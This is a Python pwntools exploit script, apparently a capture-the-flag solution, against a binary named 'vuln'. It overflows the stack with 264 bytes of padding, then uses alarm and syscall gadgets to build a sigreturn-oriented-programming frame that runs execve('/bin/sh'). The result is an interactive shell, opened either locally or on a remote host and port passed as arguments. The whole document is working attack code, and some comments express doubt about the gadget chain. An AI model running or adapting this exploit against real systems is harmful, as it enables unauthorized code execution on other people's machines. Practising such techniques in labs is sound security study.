from pwn import *
import sys

context.binary = elf = ELF('./vuln', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# === Gadgets and constants ===
syscall = 0x000000000040101d     
alarm = 0x000000000040102f       
binsh = next(elf.search(b'/bin/sh'))

# === Setup ===
if len(sys.argv) > 1:
    # Remote connection
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    # Local testing
    p = process(elf.path)
    # p = gdb.debug(elf.path, gdbscript='b *0x401022\nc')

log.info(f"[*] '/bin/sh' @ {hex(binsh)}")

# === SROP frame setup ===
frame = SigreturnFrame()
frame.rax = 59           # execve syscall
frame.rdi = binsh        # pointer to '/bin/sh'
frame.rsi = 0            # NULL
frame.rdx = 0            # NULL
frame.rip = syscall      # return to syscall

# === Payload layout ===
offset = 264             # to overwrite return address (adjust if needed)
payload  = b''
payload += b'A' * offset
payload += p64(alarm)    # return into alarm (triggers sigreturn)
payload += p64(alarm)    # needed due to enter/leave?
payload += p64(syscall)  # sigreturn triggered here (syscall with rax=15 -> rt_sigreturn)
payload += bytes(frame)  # actual sigreturn frame

p.sendline(payload)
p.interactive()

